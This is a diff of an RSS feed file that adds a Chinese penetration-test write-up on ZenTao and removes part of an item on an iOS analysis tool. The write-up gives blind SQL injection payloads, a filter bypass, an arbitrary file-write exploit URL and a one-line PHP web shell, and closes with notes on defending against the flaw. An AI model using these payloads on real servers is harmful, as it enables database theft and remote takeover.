@@ -5,7 +5,199 @@
 <link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/</link>
 <description></description>
 <language>zh-cn</language>
-<lastBuildDate>Thu, 22 Feb 2018 21:27:44 +0800</lastBuildDate>
+<lastBuildDate>Fri, 09 Mar 2018 14:42:25 +0800</lastBuildDate>
+<item>
+<title>从SQL注入到Getshell：记一次禅道系统的渗透</title>
+<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-03-07-34275981.html</link>
+<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34275981&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c9c286b86cab690e0da2551d738fc1d1_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者：&lt;/b&gt; &lt;a class=&quot;member_mention&quot; href=&quot;https://www.zhihu.com/people/03f40f07ca96c5b31c8892400eec8c1d&quot; data-hash=&quot;03f40f07ca96c5b31c8892400eec8c1d&quot; data-hovercard=&quot;p$b$03f40f07ca96c5b31c8892400eec8c1d&quot;&gt;@L3m0n&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;此过程为某站点的渗透记录，过程一波三折，但归根结底都是粗心大意造成的，不过自我认为在这个排坑的过程中也学习到了很多。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;确认版本&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;首先可以通过接口来确认一下当前禅道的版本。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/index.php?mode=getconfig&lt;/code&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c6d7fb7d4b2d437eb33d3644630813b4_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1582&quot;&gt;&lt;h2&gt;&lt;b&gt;SQL注入分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;网上之前有过一个&lt;code class=&quot;inline&quot;&gt;9.1.2&lt;/code&gt;的&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数的分析，但是没想到&lt;code class=&quot;inline&quot;&gt;9.2.1&lt;/code&gt;也存在此问题，(&lt;code class=&quot;inline&quot;&gt;2018.3.2&lt;/code&gt;号看到目前最新版本是&lt;code class=&quot;inline&quot;&gt;9.8.1&lt;/code&gt;)。&lt;/p&gt;&lt;p&gt;出问题的地方是此文件的&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数：\lib\base\dao\dao.class.php&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;public function orderBy($order)
+{
+    if($this-&amp;gt;inCondition and !$this-&amp;gt;conditionIsTrue) return $this;
+
+    $order = str_replace(array(&#39;|&#39;, &#39;&#39;, &#39;_&#39;), &#39; &#39;, $order);
+
+    /* Add &quot;`&quot; in order string. */
+    /* When order has limit string. */
+    $pos    = stripos($order, &#39;limit&#39;);
+    $orders = $pos ? substr($order, 0, $pos) : $order;
+    $limit  = $pos ? substr($order, $pos) : &#39;&#39;;
+    $orders = trim($orders);
+    if(empty($orders)) return $this;
+    if(!preg_match(&#39;/^(\w+\.)?(`\w+`|\w+)( +(desc|asc))?( *(, *(\w+\.)?(`\w+`|\w+)( +(desc|asc))?)?)*$/i&#39;, $orders)) die(&quot;Order is bad request, The order is $orders&quot;);
+
+    $orders = explode(&#39;,&#39;, $orders);
+    foreach($orders as $i =&amp;gt; $order)
+    {
+        $orderParse = explode(&#39; &#39;, trim($order));
+        foreach($orderParse as $key =&amp;gt; $value)
+        {
+            $value = trim($value);
+            if(empty($value) or strtolower($value) == &#39;desc&#39; or strtolower($value) == &#39;asc&#39;) continue;
+
+            $field = $value;
+            /* such as t1.id field. */
+            if(strpos($value, &#39;.&#39;) !== false) list($table, $field) = explode(&#39;.&#39;, $field);
+            if(strpos($field, &#39;`&#39;) === false) $field = &quot;`$field`&quot;;
+
+            $orderParse[$key] = isset($table) ? $table . &#39;.&#39; . $field :  $field;
+            unset($table);
+        }
+        $orders[$i] = join(&#39; &#39;, $orderParse);
+        if(empty($orders[$i])) unset($orders[$i]);
+    }
+    $order = join(&#39;,&#39;, $orders) . &#39; &#39; . $limit;
+
+    $this-&amp;gt;sql .= &#39; &#39; . DAO::ORDERBY . &quot; $order&quot;;
+    return $this;
+}&lt;/code&gt;&lt;p&gt;对于&lt;code class=&quot;inline&quot;&gt;limit&lt;/code&gt;后未做严格的过滤与判断，然后拼接到了&lt;code class=&quot;inline&quot;&gt;order by&lt;/code&gt;后面导致产生注入.&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$order = join(&#39;,&#39;, $orders) . &#39; &#39; . $limit;&lt;/code&gt;&lt;p&gt;看了一下&lt;code class=&quot;inline&quot;&gt;9.8.1&lt;/code&gt;的修补是对limit进行正则限制，但是事实上感觉此处正则是写了一个bug，比如正常调用&lt;code class=&quot;inline&quot;&gt;orderBy($order)&lt;/code&gt;的时候，其中&lt;code class=&quot;inline&quot;&gt;$order&lt;/code&gt;为&lt;code class=&quot;inline&quot;&gt;abc desc limit 1,1&lt;/code&gt;的时候，进入&lt;code class=&quot;inline&quot;&gt;$limit&lt;/code&gt;则是&lt;code class=&quot;inline&quot;&gt;limit 1,1&lt;/code&gt;，导致匹配失败。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;/* Add &quot;`&quot; in order string. */
+/* When order has limit string. */
+$pos    = stripos($order, &#39;limit&#39;);
+$orders = $pos ? substr($order, 0, $pos) : $order;
+$limit  = $pos ? substr($order, $pos) : &#39;&#39;;
+if($limit and !preg_match(&#39;/^[0-9]+ *(, *[0-9]+)?$/&#39;, $limit)) $limit = &#39;&#39;;&lt;/code&gt;&lt;p&gt;如果想要造成前台注入（无需登录）的话，就得先看看禅道开放了哪些接口，看是否有调用&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数。&lt;/p&gt;&lt;p&gt;\zentao\module\common\model.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;public function isOpenMethod($module, $method)
+{
+   if($module == &#39;user&#39; and strpos(&#39;login|logout|deny|reset&#39;, $method) !== false) return true;
+   if($module == &#39;api&#39;  and $method == &#39;getsessionid&#39;) return true;
+   if($module == &#39;misc&#39; and $method == &#39;ping&#39;)  return true;
+   if($module == &#39;misc&#39; and $method == &#39;checktable&#39;) return true;
+   if($module == &#39;misc&#39; and $method == &#39;qrcode&#39;) return true;
+   if($module == &#39;misc&#39; and $method == &#39;about&#39;) return true;
+   if($module == &#39;misc&#39; and $method == &#39;checkupdate&#39;) return true;
+   if($module == &#39;misc&#39; and $method == &#39;changelog&#39;) return true;
+   if($module == &#39;sso&#39; and $method == &#39;login&#39;)  return true;
+   if($module == &#39;sso&#39; and $method == &#39;logout&#39;) return true;
+   if($module == &#39;sso&#39; and $method == &#39;bind&#39;) return true;
+   if($module == &#39;sso&#39; and $method == &#39;gettodolist&#39;) return true;
+   if($module == &#39;block&#39; and $method == &#39;main&#39;) return true;
+
+   if($this-&amp;gt;loadModel(&#39;user&#39;)-&amp;gt;isLogon() or ($this-&amp;gt;app-&amp;gt;company-&amp;gt;guest and $this-&amp;gt;app-&amp;gt;user-&amp;gt;account == &#39;guest&#39;))
+   {
+       if(stripos($method, &#39;ajax&#39;) !== false) return true;
+       if(stripos($method, &#39;downnotify&#39;) !== false) return true;
+       if($module == &#39;tutorial&#39;) return true;
+       if($module == &#39;block&#39;) return true;
+       if($module == &#39;product&#39; and $method == &#39;showerrornone&#39;) return true;
+   }
+   return false;
+}&lt;/code&gt;&lt;p&gt;其中的&lt;code class=&quot;inline&quot;&gt;if($module == &#39;block&#39; and $method == &#39;main&#39;) return true;&lt;/code&gt;，也就是本次漏洞的主角，继续跟进。&lt;/p&gt;&lt;p&gt;\zentao\module\block\control.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;class block extends control
+{
+    public function __construct($moduleName = &#39;&#39;, $methodName = &#39;&#39;)
+    {
+        parent::__construct($moduleName, $methodName);
+        $this-&amp;gt;selfCall = strpos($this-&amp;gt;server-&amp;gt;http_referer, common::getSysURL()) === 0 || $this-&amp;gt;session-&amp;gt;blockModule;
+        if($this-&amp;gt;methodName != &#39;admin&#39; and $this-&amp;gt;methodName != &#39;dashboard&#39; and !$this-&amp;gt;selfCall and !$this-&amp;gt;loadModel(&#39;sso&#39;)-&amp;gt;checkKey()) die(&#39;&#39;);
+    }
+    public function main($module = &#39;&#39;, $id = 0)
+    {
+        ...
+       $mode = strtolower($this-&amp;gt;get-&amp;gt;mode);
+       if($mode == &#39;getblocklist&#39;)
+       {   
+           ...
+       }   
+       elseif($mode == &#39;getblockform&#39;)
+       {   
+           ...
+       }   
+       elseif($mode == &#39;getblockdata&#39;)
+       {
+           $code = strtolower($this-&amp;gt;get-&amp;gt;blockid);
+    
+           $params = $this-&amp;gt;get-&amp;gt;param;
+           $params = json_decode(base64_decode($params));
+            ....
+           $this-&amp;gt;viewType    = (isset($params-&amp;gt;viewType) and $params-&amp;gt;viewType == &#39;json&#39;) ? &#39;json&#39; : &#39;html&#39;;
+           $this-&amp;gt;params      = $params;
+           $this-&amp;gt;view-&amp;gt;code  = $this-&amp;gt;get-&amp;gt;blockid;
+           $this-&amp;gt;view-&amp;gt;title = $this-&amp;gt;get-&amp;gt;blockTitle;
+    
+           $func = &#39;print&#39; . ucfirst($code) . &#39;Block&#39;;
+           if(method_exists(&#39;block&#39;, $func))
+           {
+               $this-&amp;gt;$func($module);
+           }
+           else
+           {
+               $this-&amp;gt;view-&amp;gt;data = $this-&amp;gt;block-&amp;gt;$func($module, $params);
+           }
+       }
+    }
+}&lt;/code&gt;&lt;p&gt;首先看&lt;code class=&quot;inline&quot;&gt;__construct&lt;/code&gt;中，&lt;code class=&quot;inline&quot;&gt;$this-&amp;gt;selfCall&lt;/code&gt;是在验证&lt;code class=&quot;inline&quot;&gt;referer&lt;/code&gt;的值，如果为真的话则后面的&lt;code class=&quot;inline&quot;&gt;if&lt;/code&gt;将不会进入&lt;code class=&quot;inline&quot;&gt;die&lt;/code&gt;语句里面&lt;/p&gt;&lt;p&gt;接下来跟进&lt;code class=&quot;inline&quot;&gt;main&lt;/code&gt;函数，可以看到最后的&lt;code class=&quot;inline&quot;&gt;$func = &#39;print&#39; . ucfirst($code) . &#39;Block&#39;;&lt;/code&gt;，会对一些函数进行调用，与此同时，我们搜索&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;的调用的时候可以发现&lt;code class=&quot;inline&quot;&gt;printCaseBlock&lt;/code&gt;函数的存在&lt;/p&gt;&lt;p&gt;\zentao\module\block\control.php&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-dc18e0f1b6d8b747c6ec554acae5d139_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2246&quot;&gt;&lt;p&gt;所以前台注入的整个过程便比较清晰了，那么如何利用?&lt;/p&gt;&lt;h2&gt;&lt;b&gt;SQL注入利用&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;回过头来，因为禅道有windows直接的一键化安装程序，其数据库使用的也是&lt;code class=&quot;inline&quot;&gt;root&lt;/code&gt;权限，导致可直接导出shell，但是如果没有这么高权限的时候，对于这个注入应该如何出数据。&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;sql = &#39;select user()&#39;
+param = &#39;{&quot;orderBy&quot;:&quot;order limit 1;select (if(ord(mid((%s),%d,1))=%d,sleep(2),1))--&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&#39; % (sql,n,i) ,1))--&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&#39; % (sql,n,i) &lt;/code&gt;&lt;p&gt;禅道是支持多语句的，这也为后面的利用提供方便。&lt;/p&gt;&lt;p&gt;注入出数据库名和表段名后，当我想继续注入出用户账号密码的时候，意外地发现没有出数据。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;sql = &#39;select 12345 from zt_user&#39;&lt;/code&gt;&lt;p&gt;还是没有出数据，猜测是管理员改了表前缀，所以想去通过&lt;code class=&quot;inline&quot;&gt;information_schema&lt;/code&gt;查询一下表名，但是意外地发现，也不能读取？难道被删了？但是我还是想知道一下表前缀。&lt;/p&gt;&lt;p&gt;请求的时候加了一个单引号，并且加上referer，看一下报错信息。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/index.php?m=block&amp;amp;f=main&amp;amp;mode=getblockdata&amp;amp;blockid=case&amp;amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxJyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0=
+
+其中param经过BASE64解码得到
+{&quot;orderBy&quot;:&quot;order limit 1,1&#39;&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-2b635f910bb80ada4553155d1c748f29_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2710&quot;&gt;&lt;p&gt;因为PDO的关系，SQL中的表名是&lt;code class=&quot;inline&quot;&gt;%s&lt;/code&gt;替代的，所以未能够得到库名。&lt;/p&gt;&lt;p&gt;那么就利用报错去得到当前SQl语句里面查询的表名，比如利用&lt;code class=&quot;inline&quot;&gt;polygon&lt;/code&gt;函数。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-adbcf88a750df6340c76cb8c7da63235_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2696&quot;&gt;&lt;p&gt;此注入点可以理解为limit后的注入点，因为使用多语句的话，报错效果不明显，所以就直接在limit后面进行注入。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/index.php?m=block&amp;amp;f=main&amp;amp;mode=getblockdata&amp;amp;blockid=case&amp;amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKHBvbHlnb24oaWQpLDEpIyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0=
+
+param base64解码
+{&quot;orderBy&quot;:&quot;order limit 1,1 PROCEDURE ANALYSE(polygon(id),1)#&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-56760516eb1da1fa547b876b9838bd67_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2544&quot;&gt;&lt;p&gt;上图为本地测试，但是limit的注入和mysql版本还有一些关系，目前网上的payload仅限于低版本才可报错注入出数据，很不幸运的是，目标使用的是高版本mysql。&lt;/p&gt;&lt;p&gt;那既然可以多语句，在不能用&lt;code class=&quot;inline&quot;&gt;information_schema&lt;/code&gt;的情况下，可以通过下面语法来进行盲注：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;show table status where name = &#39;xxx&#39; and sleep(2)&lt;/code&gt;&lt;p&gt;写到py里面的payload是这样的&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;sql = &quot;show table status where hex(substr(name,1,8))=&#39;7a745f75736572%s&#39; and sleep(2)&quot; % binascii.b2a_hex(chr(i))
+param = &#39;{&quot;orderBy&quot;:&quot;order limit 1,1;%s--&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&#39; % sql&lt;/code&gt;&lt;p&gt;经过一番折腾发现，表前缀就是默认的&lt;code class=&quot;inline&quot;&gt;zt_&lt;/code&gt;，但是为啥又不能够读取到用户数据呢?&lt;/p&gt;&lt;p&gt;仔细看到禅道里面的&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数，发现做了过滤。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$order = str_replace(array(&#39;|&#39;, &#39;&#39;, &#39;_&#39;), &#39; &#39;, $order);&lt;/code&gt;&lt;p&gt;把下划线给过滤掉了，那这种在多语句下，可以利用mysql的预查询来绕过，值得注意的是，这个版本语法大小写敏感。&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;SET @SQL=0x494E5345525420494E544F206D6F76696520286E616D652C20636F6E74656E74292056414C55455320282761616161272C27616161612729;PREPARE pord FROM @SQL;EXECUTE pord;SET @SQL=0x494E5345525420494E544F206D6F76696520286E616D652C20636F6E74656E74292056414C55455320282761616161272C27616161612729;PREPARE pord FROM @SQL;EXECUTE pord;&lt;/code&gt;&lt;p&gt;注入出admin密码的时候，惊喜地发现不能解开，无奈之下，只能先拿到一个普通账号。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Getshell&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;禅道在防止getshell方面还花了一点心思，曾经挖到一个可以任意写文件getshell（最新版本还存在这段代码），不过需要的权限是管理员权限。&lt;/p&gt;&lt;p&gt;看了一下禅道里面人员组织架构情况，有研发、项目经理、产品经理，高层管理，系统管理员等角色，其中系统管理员虽然密码解不开，但是我们可以去解密一下高层管理的密码，因为这个角色的权限是可以修改某用户的用户组权限。在高层管理账号中，我们可以将一个普通账号修改为管理员。&lt;/p&gt;&lt;p&gt;接下来就是写文件Getshell：&lt;/p&gt;&lt;p&gt;/xampp/zentaopro/module/api/control.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;public function getModel($moduleName, $methodName, $params = &#39;&#39;)
+{
+    parse_str(str_replace(&#39;,&#39;, &#39;&amp;amp;&#39;, $params), $params);
+    $module = $this-&amp;gt;loadModel($moduleName);
+    
+    $result = call_user_func_array(array(&amp;amp;$module, $methodName), $params);
+    if(dao::isError()) die(json_encode(dao::getError()));
+    $output[&#39;status&#39;] = $result ? &#39;success&#39; : &#39;fail&#39;;
+    $output[&#39;data&#39;]   = json_encode($result);
+    $output[&#39;md5&#39;]    = md5($output[&#39;data&#39;]);
+    $this-&amp;gt;output     = json_encode($output);
+    die($this-&amp;gt;output);
+}&lt;/code&gt;&lt;p&gt;可以看到是进入了call_user_func_array，也就是我们可以任意实例化一个module方法，方法的参数也是可控的，可以通过&lt;code class=&quot;inline&quot;&gt;,&lt;/code&gt;来分割参数。&lt;/p&gt;&lt;p&gt;/zentaopro/module/editor/model.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;public function save($filePath)
+{
+    $fileContent = $this-&amp;gt;post-&amp;gt;fileContent;
+    $evils       = array(&#39;eval&#39;, &#39;exec&#39;, &#39;passthru&#39;, &#39;proc_open&#39;, &#39;shell_exec&#39;, &#39;system&#39;, &#39;$$&#39;, &#39;include&#39;, &#39;require&#39;, &#39;assert&#39;);
+    $gibbedEvils = array(&#39;e v a l&#39;, &#39;e x e c&#39;, &#39; p a s s t h r u&#39;, &#39; p r o c _ o p e n&#39;, &#39;s h e l l _ e x e c&#39;, &#39;s y s t e m&#39;, &#39;$ $&#39;, &#39;i n c l u d e&#39;, &#39;r e q u i r e&#39;, &#39;a s s e r t&#39;);
+    $fileContent = str_ireplace($gibbedEvils, $evils, $fileContent);
+    if(get_magic_quotes_gpc()) $fileContent = stripslashes($fileContent);
+
+    $dirPath = dirname($filePath);
+    $extFilePath = substr($filePath, 0, strpos($filePath, DS . &#39;ext&#39; . DS) + 4);
+    if(!is_dir($dirPath) and is_writable($extFilePath)) mkdir($dirPath, 0777, true);
+    if(is_writable($dirPath))
+    {
+        file_put_contents($filePath, $fileContent);
+    }
+    else
+    {
+        die(js::alert($this-&amp;gt;lang-&amp;gt;editor-&amp;gt;notWritable . $extFilePath));
+    }
+}&lt;/code&gt;&lt;p&gt;在editor中是可以写一个文件的，filePath可控，fileContent也是可控的，这下就是可以任意写一个文件。&lt;/p&gt;&lt;p&gt;Exp:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/?m=api&amp;amp;f=getModel&amp;amp;moduleName=editor&amp;amp;methodName=save&amp;amp;params=filePath=aaaaaa.php
+
+POST内容:
+fileContent=&amp;lt;?php $_POST[1]($_POST[2]);
+
+最后的shell地址是\zentaopro\module\api\aaaaaa.php&lt;/code&gt;&lt;p&gt;但是问题又来了，前面报错里面得到的路径目录感觉像是做了权限（这里绕弯了，路径少加了一个www，所以以为是没权限写），最终从数据库中的&lt;code class=&quot;inline&quot;&gt;zt_file&lt;/code&gt;获取上传文件的路径，然后再将shell写入当中才得以结束。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;对于&lt;code class=&quot;inline&quot;&gt;order by&lt;/code&gt;的漏洞如何进行防御的时候，我觉得上面代码在部分上有可取之处。&lt;/p&gt;&lt;p&gt;1、去掉&lt;code class=&quot;inline&quot;&gt;limit&lt;/code&gt;部分，然后限制格式&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;if(!preg_match(&#39;/^(\w+\.)?(`\w+`|\w+)( +(desc|asc))?( *(, *(\w+\.)?(`\w+`|\w+)( +(desc|asc))?)?)*$/i&#39;, $orders)) die(&quot;Order is bad request, The order is $orders&quot;);&lt;/code&gt;&lt;p&gt;2、然后循环对每个字段进行反引号的添加&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$orders = explode(&#39;,&#39;, $orders);
+foreach ($orders as $i =&amp;gt; $order) {
+	$orderParse = explode(&#39; &#39;, trim($order));
+	foreach ($orderParse as $key =&amp;gt; $value) {
+		$value = trim($value);
+		if (empty($value) or strtolower($value) == &#39;desc&#39; or strtolower($value) == &#39;asc&#39;) {
+			continue;
+		}
+
+		$field = $value;
+		/* such as t1.id field. */
+		if (strpos($value, &#39;.&#39;) !== false) {
+			list($table, $field) = explode(&#39;.&#39;, $field);
+		}
+
+		if (strpos($field, &#39;`&#39;) === false) {
+			$field = &quot;`$field`&quot;;
+		}
+
+		$orderParse[$key] = isset($table) ? $table . &#39;.&#39; . $field : $field;
+		unset($table);
+	}
+	$orders[$i] = join(&#39; &#39;, $orderParse);
+	if (empty($orders[$i])) {
+		unset($orders[$i]);
+	}
+
+}&lt;/code&gt;&lt;p&gt;整个过程就是自己在挖莫名其妙的坑，然后再一个个慢慢补上，希望能够对大家有用。&lt;/p&gt;</description>
+<author>小蘑菇</author>
+<guid isPermaLink="false">2018-03-07-34275981</guid>
+<pubDate>Wed, 07 Mar 2018 00:00:00 +0800</pubDate>
+</item>
 <item>
 <title>攻击LNMP架构Web应用的几个小Tricks</title>
 <link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-02-22-33919193.html</link>
@@ -506,15 +698,6 @@ sys	0m0.000s &lt;/code&gt;&lt;p&gt;仅需 0.8s 即可解出结果。&lt;/p&gt;&l
 <author>朱文雷</author>
 <guid isPermaLink="false">2017-10-27-30515472</guid>
 <pubDate>Fri, 27 Oct 2017 00:00:00 +0800</pubDate>
-</item>
-<item>
-<title>开源！iOS 应用安全分析工具 Passionfruit</title>
-<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-10-15-29761306.html</link>
-<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29761306&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
-&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e590742eb8fe8628767544ef478ee70d_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;Github 项目地址 &lt;a href=&quot;https://github.com/chaitin/passionfruit&quot;&gt;chaitin/passionfruit&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;前情提要&lt;/h2&gt;&lt;p&gt;虽然没有 Android 平台那么多的攻击面和利用姿势，iOS 应用依然有安全审计的需求。移动平台的安全目前采用的策略基本上都是扫描器加上一部分人工的逆向和动态分析。&lt;/p&gt;&lt;p&gt;针对 iOS 应用攻击面分析，目前笔者了解或使用过的相关工具如下（除去逆向工程使用的调试器和反汇编工具）：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Snoop-It（已停止维护）&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/dmayer/idb&quot;&gt;dmayer/idb&lt;/a&gt; idb is a tool to simplify some common tasks for iOS pentesting and research&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/mwrlabs/needle&quot;&gt;mwrlabs/needle&lt;/a&gt; The iOS Security Testing Framework&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/sensepost/objection&quot;&gt;sensepost/objection&lt;/a&gt; 📱 objection - runtime mobile exploration&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/iSECPartners/Introspy-iOS&quot;&gt;iSECPartners/Introspy-iOS&lt;/a&gt; IntroSpy&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;在使用中笔者多多少少遇到了一些问题，例如 needle 在设备上需要部署过多依赖包，idb 不兼容 iOS 10，Introspy 虽好但查询日志数据库有一些麻烦……忍不住开始造轮子。&lt;/p&gt;&lt;p&gt;审计工具所需功能大体有如下几个方面：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;分析应用是否开启了必要的编译器保护&lt;/li&gt;&lt;li&gt;分析应用沙盒内的文件内容和权限&lt;/li&gt;&lt;li&gt;分析应用使用到的 framework 和动态链接库&lt;/li&gt;&lt;li&gt;分析应用存储的数据，如 UserDefaults, BinaryCookie 和 KeyChain&lt;/li&gt;&lt;li&gt;分析剪贴板的使用&lt;/li&gt;&lt;li&gt;动态拦截和分析 Objective C 运行时方法&lt;/li&gt;&lt;li&gt;动态拦截和分析本地代码的参数调用和堆栈追踪&lt;/li&gt;&lt;li&gt;分析 UIView 的层级结构和属性&lt;/li&gt;&lt;li&gt;一些基于 hook 实现的修改功能，如设备特征伪造、绕过越狱检测、绕过 SSL Pinning 等&lt;/li&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-869fa78c8cd0772eaf1d44711a7e471a_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1556&quot;&gt;&lt;p&gt;&lt;i&gt;应用目前仍然在开发中，可能会有 bug 或功能缺失。&lt;/i&gt;&lt;/p&gt;&lt;h2&gt;设计&lt;/h2&gt;&lt;p&gt;在实现方案上，笔者选择了功能极为强大的 hook 框架 &lt;a href=&quot;https://www.frida.re/&quot;&gt;frida.re&lt;/a&gt;。关于这个框架不需要我再过多介绍，它在 iOS 平台上支持对 native 函数、Objective C 运行时的 hook 和调用，可以满足多种移动安全运行时分析的自动化需求。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5b1570480dfb0ae145555cb3a44b73fe_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;817&quot; data-rawheight=&quot;318&quot;&gt;&lt;p&gt;Passionfruit 通过 frida 注入代码到目标应用实现功能，再通过 node.js 服务端消息代理与浏览器通信，用户通过访问网页即可对 App 实现常规的检测任务。&lt;/p&gt;&lt;h2&gt;安装和使用&lt;/h2&gt;&lt;p&gt;请访问 GitHub 上的项目主页 &lt;a href=&quot;https://github.com/chaitin/passionfruit&quot;&gt;chaitin/passionfruit&lt;/a&gt; 来获取最新的版本和更新信息。&lt;/p&gt;&lt;p&gt;Passionfruit 的编译和安装依赖如下软件：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://nodejs.org/&quot;&gt;node.js&lt;/a&gt; 用于运行服务端。可根据个人喜好使用 &lt;a href=&quot;https://yarnpkg.com/&quot;&gt;yarn&lt;/a&gt; 或默认的 &lt;a href=&quot;https://www.npmjs.com/&quot;&gt;npm&lt;/a&gt; 作为包管理&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/libimobiledevice/libimobiledevice&quot;&gt;libimobiledevice&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;安装步骤&lt;/p&gt;&lt;ol&gt;&lt;li&gt;安装 node.js 和 libimobiledevice&lt;/li&gt;&lt;li&gt;通过 git 将代码仓库同步到本地&lt;/li&gt;&lt;li&gt;在越狱 iOS 设备上安装 frida&lt;/li&gt;&lt;li&gt;在非越狱设备上使用 ipa 重打包注入 fridagadget.dylib&lt;/li&gt;&lt;li&gt;第一次使用前，在代码根目录运行 npm run build 构建前端代码&lt;/li&gt;&lt;li&gt;运行 npm start 运行服务端，在浏览器中访问 localhost:31337&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;功能和演示&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;video id=&quot;None&quot; data-swfurl=&quot;&quot; poster=&quot;https://pic2.zhimg.com/80/v2-2f92b2ec64b187be4cbcaa134b697131_b.jpg&quot; data-sourceurl=&quot;https://www.zhihu.com/video/902688743067090944&quot; data-name=&quot;&quot; data-video-id=&quot;&quot; data-video-playable=&quot;true&quot; data-lens-id=&quot;902688743067090944&quot;&gt;&lt;/video&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Passionfruit 最大特点就是基于 Web 的图形界面。因此你甚至可以在 iPad Pro 这样的移动设备上访问这个图形界面……（需要修改服务端监听的配置）&lt;/p&gt;&lt;p&gt;完全图形化的界面可以快速地找到需要 hook 的函数。由于 C 函数缺少运行时参数类型信息，因此对于这些库函数您需要手动设置一下函数原型。Objective C 